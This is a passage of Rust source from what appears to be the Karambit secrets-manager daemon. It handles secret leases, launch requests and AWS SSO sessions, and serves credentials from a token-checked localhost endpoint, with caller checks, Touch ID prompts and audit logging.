            let mut g = st.lock().unwrap();
            let mut deks = serde_json::Map::new();
            let mut denied = serde_json::Map::new();
            let mut used = vec![];
            let mut exhausted = vec![];
            let revision_changed = revision != g.lease_revision;
            for n in names {
                let Some(h) = g.leases.get_mut(&n) else { continue };
                if h.info.expires <= now() {
                    continue;
                }
                let who_ok = match (&h.info.to, h.root) {
                    (Grantee::Any, _) => true,
                    (Grantee::Kind(k), _) => peer.caller.kind.as_deref() == Some(k.as_str()),
                    (Grantee::Session(_), Some(root)) => peer.descends_from(root),
                    (Grantee::Session(_), None) => false,
                    // Human self-leases live in a separate map; never served on the agent path.
                    (Grantee::Human, _) => false,
                };
                if !who_ok {
                    continue;
                }
                if session_mint.contains(&n) {
                    denied.insert(n.clone(), json!(SESSION_MINT_REFUSAL));
                    continue;
                }
                // Recheck after the snapshot; a concurrent scope change must not
                // turn a refused scoped request into an unscoped release.
                if revision_changed || scopes.get(&n) != Some(&h.scope) {
                    denied.insert(n.clone(), json!("lease scope changed; retry"));
                    continue;
                }
                // Only LaunchRedeem can spend command-scoped authority.
                if !h.scope.cmds.is_empty() {
                    denied.insert(n.clone(), json!(SCOPED_LEGACY_REFUSAL));
                    continue;
                }
                if let Some(root) = &h.scope.cwd {
                    let ok = cwd.as_deref().is_some_and(|c| under(c, root));
                    if !ok {
                        denied.insert(n.clone(), json!(format!("lease only valid under {root}")));
                        continue;
                    }
                }
                h.uses += 1;
                deks.insert(n.clone(), json!(B64.encode(h.dek.as_ref())));
                used.push(json!({"secret": n, "to": h.info.to_label, "expires": h.info.expires, "use": h.uses}));
                if h.scope.max_uses.is_some_and(|m| h.uses >= m) {
                    exhausted.push(n.clone());
                }
            }
            for n in &exhausted {
                g.leases.remove(n);
            }
            drop(g);
            if !exhausted.is_empty() {
                log_event(p, "lease-used-up", &exhausted, json!({}));
            }
            if !denied.is_empty() {
                crate::audit::log(p, crate::audit::Event {
                    action: "daemon-use-refused", secrets: &denied.keys().cloned().collect::<Vec<_>>(),
                    caller: &peer.caller, detail: json!({"denied": denied}),
                    result: &Err(anyhow!("legacy lease use refused")),
                })?;
            }
            Ok(json!({"deks": deks, "denied": denied, "via": used,
                "peer": {"kind": peer.caller.kind, "session": peer.caller.session, "pid": peer.caller.pid,
                         "cwd": peer.caller.cwd, "branch": peer.caller.branch, "chain": peer.caller.chain}}))
        }
        Req::LaunchPrepare { allow_hosts, jail, refs, env, target, argv, cwd, aws, ambient_bytes, no_redact } => {
            prepare_launch(p, st, &peer, refs, env, target, argv, cwd, aws, jail, allow_hosts, ambient_bytes, no_redact)
        }
        Req::LaunchRedeem { token } => { let _token = Zeroizing::new(token); bail!("launch refused"); }
        Req::LaunchRedaction { .. } => bail!("launch refused"), // raw zeroizing response only
        Req::LaunchBind { .. } => bail!("launch refused"), // Only the connection upgrade owns this authority.
        Req::LaunchCancel { id } => {
            let owner = agent::process_identity(peer.pid).map_err(|_| anyhow!("launch refused"))?;
            let canceled = {
                let mut g = st.lock().unwrap();
                let canceled = g.pending_launches.cancel(&id, owner, now())?;
                g.reconcile_launch_endpoints();
                canceled
            };
            audit_bound_containment(p, st);
            if let Some(launch) = canceled {
                crate::audit::launch_contained(p, "launch-cancel", &launch, &peer.caller);
            }
            Ok(json!({"ok": true}))
        }
        Req::Revoke { patterns } => {
            let mut g = st.lock().unwrap();
            g.lease_revision += 1;
            let hit: Vec<String> = g
                .leases
                .keys()
                .chain(g.human.keys().map(|(_, _, name)| name))
                .filter(|n| patterns.iter().any(|pt| store::glob_match(pt, n)))
                .cloned()
                .collect();
            for n in &hit {
                g.leases.remove(n);
                g.human.retain(|(_, _, name), _| name != n);
            }
            let launches = g.pending_launches.burn_matching(&patterns);
            g.reconcile_launch_endpoints();
            drop(g);
            audit_contained_launches(p, "launch-revoke", launches);
            audit_bound_containment(p, st);
            Ok(json!({"revoked": hit}))
        }
        Req::List => {
            let g = st.lock().unwrap();
            let t = now();
            let v: Vec<Value> = g
                .leases
                .values()
                .chain(g.human.values())
                .filter(|h| h.info.expires > t)
                .map(|h| {
                    let mut info = h.info.clone();
                    info.remaining = info.expires.saturating_sub(t);
                    json!(LeaseView { info, scope: h.scope.clone(), uses: h.uses })
                })
                .collect();
            Ok(json!({"leases": v, "aws_endpoints": g.aws.len()}))
        }
        Req::AwsOpen { profile, creds, ttl } => {
            if peer.caller.is_agent() {
                let name = if profile.starts_with("aws/") { profile.clone() } else { format!("aws/{profile}") };
                // Missing files supply no independent policy authority. Preserve
                // legacy caller-supplied endpoints when no scoped lease applies.
                let independent = store::load_secret(p, &name).is_ok_and(|f|
                    crate::run_authorization(&peer.caller, &f, false, false) != crate::RunAuthorization::Deny);
                if !independent && active_scoped_lease(&st.lock().unwrap(), &peer, &name) {
                    bail!(SCOPED_LEGACY_REFUSAL);
                }
            }
            let (id, token) = new_endpoint_ids();
            let ttl = ttl.clamp(60, 12 * 3600);
            st.lock().unwrap().aws.insert(
                id.clone(),
                AwsEp { caller: peer.caller.clone(), profile, creds: Zeroizing::new(creds), token: token.clone(), expires: Instant::now() + Duration::from_secs(ttl), sso: None, binding: None, launch: None, unredacted: false },
            );
            Ok(json!({"id": id, "url": format!("http://127.0.0.1:{http_port}/creds/{id}"), "token": token}))
        }
        Req::AwsClose { id } => {
            {
                let mut g = st.lock().unwrap();
                g.aws.remove(&id);
                g.reconcile_launch_endpoints();
            }
            audit_bound_containment(p, st);
            Ok(json!({"ok": true}))
        }
        Req::SsoSet { mut session, profiles, limit_minutes } => {
            // A hand-edited config can hold any number: use the nearest allowed limit.
            let limit_minutes = limit_minutes.map(|m| m.clamp(*crate::sso::LIMIT_MINUTES.start(), *crate::sso::LIMIT_MINUTES.end()));
            let profiles: Vec<crate::sso::SsoReg> = profiles.into_iter().filter(|r| session.serves(&r.profile)).collect();
            for r in &profiles { validate_sso_registration(r)?; }
            // The daemon writes this prompt itself: callers can't be trusted to describe
            // what they're enabling, and human-vs-agent detection is only a heuristic.
            // The limit is always stated: it comes from config.json, which any process
            // running as you could edit.
            let agent_ok = profiles.iter().filter(|r| r.agent_allowed).count();
            crate::platform::helper::auth(&Prompt::SsoLogin {
                portal: session.portal.clone(), url: session.start_url.clone(),
                agent_count: agent_ok.to_string(), profile_count: profiles.len().to_string(),
                duration: crate::sso::limit_words(limit_minutes),
            })?;
            // The sign-in and its limit are timed here, never taken from the caller.
            session.signed_in_at = now();
            session.renew_until = limit_minutes.map(|m| session.signed_in_at + crate::sso::limit_secs(m));
            let mut g = st.lock().unwrap();
            let portal = session.portal.clone();
            g.invalidate_session(&portal);
            // Replace this portal's profiles only; other portals keep theirs.
            let old: Vec<String> = g.sso_profiles.iter().filter(|(_, r)| r.profile.portal == portal).map(|(n, _)| n.clone()).collect();
            for n in &old {
                g.sso_profiles.remove(n);
                g.sso_creds.remove(n);
            }
            let n = profiles.len();
            for r in profiles {
                g.invalidate_registration(&r.name);
                g.sso_profiles.insert(r.name.clone(), r);
            }
            g.sso_ended.remove(&portal);
            g.sso_trouble.remove(&portal);
            g.sso.insert(portal.clone(), session);
            drop(g);
            log_event(p, "sso-login", &[], json!({"portal": portal, "profiles": n, "limit_minutes": limit_minutes}));
            Ok(json!({"ok": true, "profiles": n}))
        }
        Req::SsoLimit { portal, minutes } => {
            // Human only (fenced above), like sign-out: shortening a limit can sign a portal out now.
            if let Some(m) = minutes {
                crate::sso::validate_limit_minutes(m)?;
            }
            sso_set_limit(st, p, &portal, minutes, crate::platform::helper::auth)
        }
        Req::SsoDiscover { portal } => {
            sso_renew(st, p, &portal, 120, None)?;
            let (session, revision) = {
                let g = st.lock().unwrap();
                (g.sso.get(&portal).cloned().ok_or_else(|| portal_gone(&g, &portal))?, g.session_revision(&portal))
            };
            let roles = crate::sso::discover(&session)?;
            let g = st.lock().unwrap();
            if g.session_revision(&portal) != revision || !g.sso.get(&portal).is_some_and(|s| !s.limit_passed()) {
                bail!("SSO session changed; run karambit login and retry");
            }
            Ok(json!(roles))
        }
        Req::SsoImportPreview { portal, roles } => {
            let g = st.lock().unwrap();
            if !g.sso.get(&portal).is_some_and(|s| !s.limit_passed()) { bail!("run karambit login {portal} first"); }
            let regs: Vec<_> = g.sso_profiles.values().cloned().collect();
            let taken: Vec<_> = store::list_secrets(p)?.into_iter().map(|f| f.name).collect();
            Ok(json!(crate::sso::import_preview(&portal, &roles, &regs, &taken)?))
        }
        Req::SsoImport { portal, items, tier, agent_allowed, region } => {
            let v = peer_vault(p, &peer)?;
            if items.len() > 2000 { bail!("too many SSO import entries"); }
            if tier == store::Tier::Open && !agent_allowed { bail!("Only me requires Touch ID"); }
            let (_, pc) = v.sso_portal(Some(&portal))?;
            let (session_revision, registrations, existing) = {
                let g = st.lock().unwrap();
                let session = g.sso.get(&portal).ok_or_else(|| portal_gone(&g, &portal))?;
                if session.limit_passed() || session.start_url != pc.start_url || session.region != pc.region { bail!("run karambit login {portal} first"); }
                (g.session_revision(&portal), g.registration_revisions.clone(), g.sso_profiles.values().cloned().collect::<Vec<_>>())
            };
            let mut skipped = 0;
            let mut profiles = vec![];
            let mut names = std::collections::HashSet::new();
            let mut tuples = std::collections::HashSet::new();
            let mut account_names = std::collections::BTreeMap::new();
            for i in items {
                if let Some(n) = i.account_name.as_deref().and_then(crate::sso::clean_account_name)
                    && crate::sso::validate_account(&i.account_id).is_ok() {
                    account_names.insert(i.account_id.clone(), n);
                }
                let name = crate::aws::entry_name(&i.name)?;
                let profile = crate::sso::SsoProfile { portal: portal.clone(), start_url: pc.start_url.clone(), sso_region: pc.region.clone(), account_id: i.account_id, role_name: i.role, region: region.clone() };
                profile.validate()?;
                if !tuples.insert((profile.account_id.clone(), profile.role_name.clone())) || existing.iter().any(|r| r.profile.portal == portal && r.profile.account_id == profile.account_id && r.profile.role_name == profile.role_name) || p.secret(&name)?.exists() {
                    skipped += 1; continue;
                }
                if !names.insert(name.clone()) { bail!("duplicate import name"); }
                profiles.push((name, profile));
            }
            if profiles.is_empty() { return Ok(json!({"added": 0, "skipped": skipped})); }
            let files_before = serde_json::to_value(store::list_secrets(p)?)?;
            crate::platform::helper::auth(&Prompt::SsoRegister { profiles: format!("Import {} profiles from {} ({})", profiles.len(), portal, if tier == store::Tier::Open { "Agents" } else if agent_allowed { "Agents + Touch ID" } else { "Only me + Touch ID" }) })?;
            let prepared = v.prepare_sso_import(&profiles, tier, agent_allowed)?;
            let config_lock = store::lock_config(p)?;
            if serde_json::to_value(config_lock.load()?)? != serde_json::to_value(&v.cfg)? { bail!("config changed; retry import"); }
            let mut g = st.lock().unwrap();
            if g.session_revision(&portal) != session_revision || g.registration_revisions != registrations || !g.sso.get(&portal).is_some_and(|s| !s.limit_passed()) || serde_json::to_value(store::list_secrets(p)?)? != files_before {
                bail!("SSO state changed during approval; retry import");
            }
            // Display labels for the AWS page's account folders, under the same config lock.
            if account_names.len() <= 2000 {
                let mut cfg = config_lock.load()?;
                if let Some(pc) = cfg.sso_portals.get_mut(&portal) && pc.start_url == v.cfg.sso_portals.get(&portal).map(|x| x.start_url.clone()).unwrap_or_default() {
                    let before = pc.accounts.clone();
                    pc.accounts.extend(account_names);
                    if pc.accounts != before { config_lock.save(&cfg)?; }
                }
            }
            let mut added = 0;
            for (file, reg) in prepared {
                if !store::save_secret_new(p, &file)? { skipped += 1; continue; }
                g.invalidate_registration(&reg.name);
                g.sso_profiles.insert(reg.name.clone(), reg);
                added += 1;
            }
            Ok(json!({"added": added, "skipped": skipped}))
        }
        Req::SsoRegister { profiles } => {
            for r in &profiles { validate_sso_registration(r)?; }
            let (keep, widen, snapshot) = {
                let g = st.lock().unwrap();
                // Only profiles whose portal is signed in (same name, URL and region).
                let keep: Vec<crate::sso::SsoReg> =
                    profiles.into_iter().filter(|r| g.sso.get(&r.profile.portal).is_some_and(|s| s.serves(&r.profile))).collect();
                // Widening = new profile, different account/role, or looser access.
                let widen: Vec<String> = keep
                    .iter()
                    .filter(|r| match g.sso_profiles.get(&r.name) {
                        None => true,
                        Some(o) => {
                            o.profile != r.profile
                                || (!o.agent_allowed && r.agent_allowed)
                                || (o.tier == store::Tier::Bio && r.tier == store::Tier::Open)
                                || o.dek_sha256 != r.dek_sha256
                        }
                    })
                    .map(|r| {
                        let lvl = if r.tier == store::Tier::Open { "agents" } else if r.agent_allowed { "agents + Touch ID" } else { "only me + Touch ID" };
                        format!("{} ({}: {} / {}, {lvl})", r.name.trim_start_matches("aws/"), r.profile.portal, r.profile.account_id, r.profile.role_name)
                    })
                    .collect();
                let snapshot: Vec<_> = keep.iter().map(|r| (r.name.clone(), g.registration_revision(&r.name), r.profile.portal.clone(), g.session_revision(&r.profile.portal))).collect();
                (keep, widen, snapshot)
            };
            if keep.is_empty() {
                return Ok(json!({"ok": true, "registered": 0}));
            }
            if !widen.is_empty() {
                // Approved on screen: refuse a list the 120-character field would cut.
                let widen = widen.join("; ");
                if crate::platform::helper::prompt_param(&widen) != widen { bail!("too many profiles for one prompt; register fewer"); }
                crate::platform::helper::auth(&Prompt::SsoRegister { profiles: widen })?;
            }
            #[cfg(test)]
            sso_test_checkpoint("register-commit");
            let mut g = st.lock().unwrap();
            for (name, revision, portal, session) in snapshot {
                if g.registration_revision(&name) != revision || g.session_revision(&portal) != session || !g.sso.contains_key(&portal) {
                    bail!("SSO registration/session changed; retry");
                }
            }
            let n = keep.len();
            for r in keep {
                g.invalidate_registration(&r.name);
                g.sso_profiles.insert(r.name.clone(), r);
            }
            Ok(json!({"ok": true, "registered": n}))
        }
        Req::SsoForget { names } => {
            let mut g = st.lock().unwrap();
            for n in &names {
                g.invalidate_registration(n);
                g.sso_profiles.remove(n);
            }
            g.aws.retain(|_, e| !e.sso.as_ref().is_some_and(|n| names.contains(n)));
            Ok(json!({"ok": true}))
        }
        Req::SsoLogout { portal } => {
            let mut g = st.lock().unwrap();
            let gone: Vec<String> = match &portal {
                Some(pn) => g.sso_profiles.iter().filter(|(_, r)| &r.profile.portal == pn).map(|(n, _)| n.clone()).collect(),
                None => g.sso_profiles.keys().cloned().collect(),
            };
            let portals: Vec<_> = match &portal { Some(pn) => vec![pn.clone()], None => g.sso.keys().cloned().collect() };
            for pn in portals { g.invalidate_session(&pn); }
            match &portal {
                Some(pn) => {
                    g.sso.remove(pn);
                    g.sso_ended.remove(pn);
                    g.sso_trouble.remove(pn);
                }
                None => {
                    g.sso.clear();
                    g.sso_ended.clear();
                    g.sso_trouble.clear();
                }
            }
            for n in &gone {
                g.sso_profiles.remove(n);
                g.sso_creds.remove(n);
            }
            g.aws.retain(|_, e| !e.sso.as_ref().is_some_and(|n| gone.contains(n)));
            Ok(json!({"ok": true, "profiles": gone.len()}))
        }
        Req::SsoStatus => {
            let g = st.lock().unwrap();
            let t = now();
            let portals: Vec<Value> = g
                .sso
                .values()
                .map(|s| {
                    let mut names: Vec<&String> = g.sso_profiles.iter().filter(|(_, r)| r.profile.portal == s.portal).map(|(n, _)| n).collect();
                    names.sort();
                    // Only worth saying once agents notice: the token has run out.
                    let trouble = g.sso_trouble.get(&s.portal).filter(|_| s.access_expires_at <= t);
                    json!({
                        "portal": s.portal,
                        "start_url": s.start_url,
                        "region": s.region,
                        "access_expires_at": s.access_expires_at,
                        "can_refresh": s.refresh_token.is_some(),
                        "signed_in_at": s.signed_in_at,
                        "renew_until": s.renew_until,
                        "renew_error": trouble,
                        "profiles": names,
                    })
                })
                .collect();
            let mut all: Vec<&String> = g
                .sso_profiles
                .iter()
                .filter(|(_, r)| g.sso.get(&r.profile.portal).is_some_and(|s| s.serves(&r.profile)))
                .map(|(n, _)| n)
                .collect();
            all.sort();
            let ended: serde_json::Map<String, Value> =
                g.sso_ended.iter().map(|(k, e)| (k.clone(), json!({"at": e.at, "why": e.why, "limit": e.limit}))).collect();
            // Non-secret labels for grouping the AWS page by portal and account.
            let registered: serde_json::Map<String, Value> = g.sso_profiles.iter()
                .map(|(n, r)| (n.clone(), json!({"portal": r.profile.portal, "account": r.profile.account_id, "role": r.profile.role_name}))).collect();
            Ok(json!({"logged_in": !portals.is_empty(), "portals": portals, "profiles": all, "ended": ended, "registered": registered}))
        }
        Req::SsoOpen { name, dek, ttl } => {
            let (reg, binding) = {
                let g = st.lock().unwrap();
                (g.sso_profiles.get(&name).cloned(), g.binding(&name)?)
            };
            let Some(reg) = reg else {
                bail!("{name} isn't active in an AWS SSO session: sign in to its portal in the Karambit app, or run `karambit aws sso login` in a terminal");
            };
            validate_sso_registration(&reg)?;
            if peer.caller.is_agent() && !reg.agent_allowed
                && active_scoped_lease(&st.lock().unwrap(), &peer, &name)
            {
                bail!(SCOPED_LEGACY_REFUSAL);
            }
            // Access level, from what a human registered (not from the vault file).
            if peer.caller.is_agent() && !reg.agent_allowed {
                bail!("agent ({}) not allowed to use {name}: it's Only me + Touch ID", peer.caller.label());
            }
            if let Some(want) = &reg.dek_sha256 {
                let ok = dek.as_deref().and_then(|d| B64.decode(d).ok()).is_some_and(|raw| crate::sso::sha256_hex(&raw) == *want);
                if !ok {
                    bail!("{name} needs Touch ID (or a lease) to use");
                }
            }
            if reg.tier == store::Tier::Open && !reg.agent_allowed {
                if crate::ssh_without_human(&peer.caller) { bail!(crate::SSH_HUMAN_REFUSAL); }
                crate::platform::helper::auth(&Prompt::SsoUse { name: name.clone(), account: reg.profile.account_id.clone(), role: reg.profile.role_name.clone() })?;
            }
            // Revalidate every proof branch before acquisition, including matching DEKs.
            sso_fresh_creds_bound(st, p, &name, &binding)?;
            let (id, token) = new_endpoint_ids();
            let ttl = ttl.clamp(60, 12 * 3600);
            #[cfg(test)]
            sso_test_checkpoint("open-commit");
            let mut g = st.lock().unwrap();
            g.check_binding(&name, &binding)?;
            g.aws.insert(
                id.clone(),
                AwsEp {
                    caller: peer.caller.clone(),
                    profile: name.clone(),
                    creds: Zeroizing::new(String::new()),
                    token: token.clone(),
                    expires: Instant::now() + Duration::from_secs(ttl),
                    sso: Some(name.clone()),
                    binding: Some(binding),
                    launch: None,
                    unredacted: false,
                },
            );
            Ok(json!({"id": id, "url": format!("http://127.0.0.1:{http_port}/creds/{id}"), "token": token,
                "region": reg.profile.child_region(), "account": reg.profile.account_id, "role": reg.profile.role_name}))
        }
    }
}

fn new_endpoint_ids() -> (String, String) {
    let mut idb = [0u8; 8];
    let mut tokb = [0u8; 24];
    {
        use rand::RngCore;
        rand::rngs::OsRng.fill_bytes(&mut idb);
        rand::rngs::OsRng.fill_bytes(&mut tokb);
    }
    (idb.iter().map(|b| format!("{b:02x}")).collect(), tokb.iter().map(|b| format!("{b:02x}")).collect())
}

/// Role credentials for a registered SSO profile: cached until 5 minutes before
/// expiry, then re-minted. Renews the SSO access token (refresh token) when AWS
/// rejects it or it's about to expire. Network calls run without the state lock.
/// Seconds before `expires_at` to treat something as stale: 5 min, but never more
/// than a fifth of its lifetime (short-lived creds would otherwise always be "stale").
fn margin(issued: u64, expires_at: u64, cap: u64) -> u64 {
    (expires_at.saturating_sub(issued) / 5).min(cap)
}

/// Portal of a registered SSO profile.
fn reg_portal(g: &State, name: &str) -> Result<String> {
    Ok(g.sso_profiles.get(name).with_context(|| format!("{name} isn't an active SSO profile"))?.profile.portal.clone())
}

/// Why a portal has no sign-in right now, as an error an agent can act on.
fn portal_gone(g: &State, portal: &str) -> anyhow::Error {
    match g.sso_ended.get(portal) {
        Some(e) => anyhow!(crate::sso::SessionEnded { portal: portal.to_string(), why: e.why.clone(), limit: e.limit }),
        None => anyhow!("AWS SSO portal {portal} is signed out: sign in from the Karambit app, or run `karambit aws sso login {portal}`"),
    }
}

/// Portals the SSO keeper should look at now: past their sign-in limit, or with an
/// access token about to expire (unless a retry after trouble isn't due yet).
fn sso_due(g: &State, t: u64, retry_at: &HashMap<String, u64>) -> Vec<String> {
    let mut due: Vec<String> = g
        .sso
        .values()
        .filter(|s| {
            s.limit_passed()
                || (s.access_expires_at <= t + margin(s.access_issued_at, s.access_expires_at, 120)
                    && retry_at.get(&s.portal).is_none_or(|r| *r <= t))
        })
        .map(|s| s.portal.clone())
        .collect();
    due.sort();
    due
}

/// One SSO token exchange at a time: AWS may rotate the refresh token, so two
/// concurrent refreshes would race and the loser would end the sign-in.
static SSO_NET: Mutex<()> = Mutex::new(());

/// Set a signed-in portal's sign-in limit, counted from when it signed in. `confirm`
/// (Touch ID) is asked only when that lengthens or removes the limit. A limit already
/// passed signs the portal out now.
fn sso_set_limit(st: &Mutex<State>, p: &Paths, portal: &str, minutes: Option<u32>, confirm: impl FnOnce(&Prompt) -> Result<()>) -> Result<Value> {
    let cur = {
        let g = st.lock().unwrap();
        g.sso.get(portal).map(|s| (g.session_revision(portal), s.signed_in_at, s.renew_until))
    };
    let Some((revision, at, until)) = cur else {
        return Ok(json!({"ok": true, "session": false}));
    };
    let want = minutes.map(|m| at + crate::sso::limit_secs(m));
    let longer = match (until, want) {
        (None, _) => false,
        (Some(_), None) => true,
        (Some(o), Some(n)) => n > o,
    };
    let operation = || {
        if longer {
            confirm(&Prompt::SsoLimit { portal: portal.into(), duration: crate::sso::limit_words(minutes) })?;
        }
        let ended = {
            let mut g = st.lock().unwrap();
            // Same sign-in still? A new one meanwhile got its own limit.
            if g.session_revision(portal) != revision { bail!("SSO session changed; retry"); }
            let Some(s) = g.sso.get_mut(portal) else {
                return Ok(json!({"ok": true, "session": false, "asked": longer}));
            };
            if s.renew_until != until {
                bail!("sign-in limit changed concurrently; retry");
            }
            s.renew_until = want;
            s.limit_reached().map(|e| (s.clone(), e))
        };
        if let Some((s, e)) = &ended {
            end_sso(st, p, s, revision, e);
        }
        Ok(json!({"ok": true, "session": true, "asked": longer, "ended": ended.is_some(), "renew_until": want}))
    };
    let caller = crate::agent::Caller::default();
    if longer {
        crate::audit::run(p, "daemon-sso-limit", &[], &caller, json!({"portal": portal}), operation)
    } else {
        crate::audit::containment(p, "daemon-sso-limit-shortening", &caller, operation)
    }

}

/// Keep one portal's sign-in going: end it if its sign-in limit passed, renew its
/// access token when it's within `ahead` seconds of expiring (or now, if AWS just
/// `rejected` this access token and nobody has renewed it since), and end it if AWS
/// won't renew it. Network calls run without the state lock. Errors are
/// [`crate::sso::SessionEnded`] once it's over (the portal is then signed out), or
/// plain errors for trouble worth retrying.
fn sso_renew(st: &Mutex<State>, p: &Paths, portal: &str, ahead: u64, rejected: Option<&str>) -> Result<()> {
    let _net = SSO_NET.lock().unwrap_or_else(|e| e.into_inner());
    let (mut sess, revision) = {
        let g = st.lock().unwrap();
        (g.sso.get(portal).cloned().ok_or_else(|| portal_gone(&g, portal))?, g.session_revision(portal))
    };
    if let Some(end) = sess.limit_reached() {
        end_sso(st, p, &sess, revision, &end);
        bail!(end);
    }
    let force = match rejected {
        // Renewed by another request while we waited: use that token.
        Some(t) if t != sess.access_token => return Ok(()),
        Some(_) => true,
        None => false,
    };
    if !force && sess.access_expires_at > now() + margin(sess.access_issued_at, sess.access_expires_at, ahead) {
        return Ok(());
    }
    // No refresh token (can't renew): it works until it expires.
    if !force && sess.refresh_token.is_none() && sess.access_expires_at > now() {
        return Ok(());
    }
    // These are local containment decisions, not refresh attempts.
    if sess.client_expires_at <= now() || sess.refresh_token.is_none() {
        let end = sess.ended("AWS sign-in can no longer refresh");
        end_sso(st, p, &sess, revision, &end);
        bail!(end);
    }
    crate::audit::run(p, "sso-refresh", &[], &crate::agent::Caller::default(), json!({"portal": portal}), || {
        match sess.refresh() {
            Ok(()) => {
                let mut g = st.lock().unwrap();
                // Save the renewed tokens only if that portal wasn't signed in again meanwhile.
                if g.session_revision(portal) != revision { bail!("SSO session changed; retry"); }
                if let Some(cur) = g.sso.get_mut(portal) {
                    cur.update_tokens(&sess);
                    g.sso_trouble.remove(portal);
                }
                Ok(())
            }
            Err(e) => {
                match e.downcast_ref::<crate::sso::SessionEnded>() {
                    Some(end) => end_sso(st, p, &sess, revision, end),
                    None => {
                        let mut g = st.lock().unwrap();
                        // Only for this sign-in, not one that replaced it meanwhile.
                        if g.session_revision(portal) == revision && g.sso.contains_key(portal) {
                            g.sso_trouble.insert(portal.to_string(), format!("{e:#}"));
                        }
                    }
                }
                Err(e)
            }
        }
    })
}

/// A portal's sign-in is over: sign it out, unless it was signed in again meanwhile,
/// and record why for `sso_status` and the audit log. Its profiles stay registered
/// (unusable without a sign-in) so agents mid-run are told why; the next sign-in
/// replaces them. Credentials already handed out last until they expire.
fn end_sso(st: &Mutex<State>, p: &Paths, sess: &crate::sso::Session, revision: u64, end: &crate::sso::SessionEnded) {
    let names = {
        let mut g = st.lock().unwrap();
        if g.session_revision(&sess.portal) != revision || !g.sso.get(&sess.portal).is_some_and(|s| s.client_id == sess.client_id) {
            return;
        }
        g.invalidate_session(&sess.portal);
        g.sso.remove(&sess.portal);
        g.sso_trouble.remove(&sess.portal);
        let mut names: Vec<String> = g.sso_profiles.iter().filter(|(_, r)| r.profile.portal == sess.portal).map(|(n, _)| n.clone()).collect();
        names.sort();
        for n in &names {
            g.sso_creds.remove(n);
        }
        g.sso_ended.insert(sess.portal.clone(), Ended { at: now(), why: end.why.clone(), limit: end.limit });
        names
    };
    log_event(p, "sso-ended", &names, json!({"portal": sess.portal, "why": end.why}));
}

/// Role credentials for a registered SSO profile, cached until 5 minutes before they
/// expire, plus when its portal's sign-in limit ends (if set). Renews the SSO token
/// when it's about to expire or AWS rejects it, and ends the sign-in when AWS won't
/// renew it. Network calls run without the state lock.
#[cfg(all(test, debug_assertions))]
fn sso_fresh_creds(st: &Mutex<State>, p: &Paths, name: &str) -> Result<(AwsCreds, u64, Option<u64>)> {
    let binding = st.lock().unwrap().binding(name)?;
    sso_fresh_creds_bound(st, p, name, &binding)
}

fn sso_fresh_creds_bound(st: &Mutex<State>, p: &Paths, name: &str, binding: &SsoBinding) -> Result<(AwsCreds, u64, Option<u64>)> {
    crate::audit::run(p, "sso_fresh_creds", &[], &crate::agent::Caller::default(), json!({}), || {
        let portal = {
            let g = st.lock().unwrap();
            g.check_binding(name, binding)?;
            let portal = binding.portal.clone();
            let s = g.sso.get(&portal).ok_or_else(|| portal_gone(&g, &portal))?;
            // Past the limit: nothing more, not even cached credentials.
            if !s.limit_passed()
                && let Some(c) = g.sso_creds.get(name)
                && c.binding == *binding
                && c.expires_at > now() + margin(c.issued, c.expires_at, 300)
            {
                return Ok((AwsCreds::from_json(c.creds.as_bytes())?, c.expires_at, s.renew_until));
            }
            portal
        };
        sso_renew(st, p, &portal, 60, None)?;
        let mut forced = false;
        loop {
            let (sess, reg) = {
                let g = st.lock().unwrap();
                g.check_binding(name, binding)?;
                let sess = g.sso.get(&portal).cloned().ok_or_else(|| portal_gone(&g, &portal))?;
                let reg = g.sso_profiles.get(name).cloned().with_context(|| format!("{name} isn't an active SSO profile"))?;
                (sess, reg)
            };
            let pr = &reg.profile;
            match crate::sso::role_credentials(&sess, &pr.account_id, &pr.role_name, pr.child_region()) {
                Ok((creds, exp)) => {
                    #[cfg(test)]
                    sso_test_checkpoint("creds-commit");
                    let mut g = st.lock().unwrap();
                    g.check_binding(name, binding)?;
                    let current = &g.sso[&portal];
                    if current.limit_passed() { bail!("AWS sign-in limit passed"); }
                    let until = current.renew_until;
                    let json = Zeroizing::new(String::from_utf8(creds.to_json()?.to_vec())?);
                    g.sso_creds.insert(name.to_string(), SsoCreds { creds: json, issued: now(), expires_at: exp, binding: binding.clone() });
                    return Ok((creds, exp, until));
                }
                // AWS rejected the token: renew it once and try again.
                Err(e) if e.downcast_ref::<crate::sso::Unauthorized>().is_some() && !forced => {
                    forced = true;
                    sso_renew(st, p, &portal, 60, Some(&sess.access_token))?;
                }
                // Rejected again right after renewing: this sign-in is over.
                Err(e) if e.downcast_ref::<crate::sso::Unauthorized>().is_some() => {
                    let end = sess.ended("AWS rejected its renewed token");
                    end_sso(st, p, &sess, binding.session, &end);
                    bail!(end);
                }
                Err(e) => return Err(e),
            }
        }
    })
}

/// Minimal HTTP/1.1 handler for `GET /creds/<id>` with `Authorization: <token>`.
/// Response follows the ECS container-credentials format the AWS SDKs expect.
fn serve_aws(mut c: TcpStream, st: &Mutex<State>, p: &Paths) -> Result<()> {
    crate::audit::run(p, "serve_aws", &[], &crate::agent::Caller::default(), json!({}), || {
        c.set_read_timeout(Some(Duration::from_secs(5)))?;
        let mut buf = Vec::with_capacity(2048);
        let mut chunk = [0u8; 1024];
        while !buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() < 16 * 1024 {
            let n = c.read(&mut chunk)?;
            if n == 0 {
                break;
            }
            buf.extend_from_slice(&chunk[..n]);
        }
        let text = String::from_utf8_lossy(&buf);
        let mut lines = text.split("\r\n");
        let first = lines.next().unwrap_or("");
        let path = first.split_whitespace().nth(1).unwrap_or("");
        let auth = lines
            .take_while(|l| !l.is_empty())
            .find_map(|l| l.split_once(':').filter(|(k, _)| k.eq_ignore_ascii_case("authorization")).map(|(_, v)| v.trim().to_string()));
        let reply = |c: &mut TcpStream, code: &str, body: &str| {
            write!(c, "HTTP/1.1 {code}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len())
        };
        let Some(id) = path.strip_prefix("/creds/") else {
            reply(&mut c, "404 Not Found", "{}")?;
            return Ok(());
        };
        let g = st.lock().unwrap();
        let Some(ep) = g.aws.get(id).filter(|e| e.expires > Instant::now()) else {
            drop(g);
            reply(&mut c, "404 Not Found", "{}")?;
            return Ok(());
        };
        // Constant-time compare of the bearer token.
        let ok = auth.as_deref().is_some_and(|a| {
            let (a, b) = (a.as_bytes(), ep.token.as_bytes());
            a.len() == b.len() && a.iter().zip(b).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
        });
        if !ok {
            drop(g);
            reply(&mut c, "401 Unauthorized", "{}")?;
            return Ok(());
        }
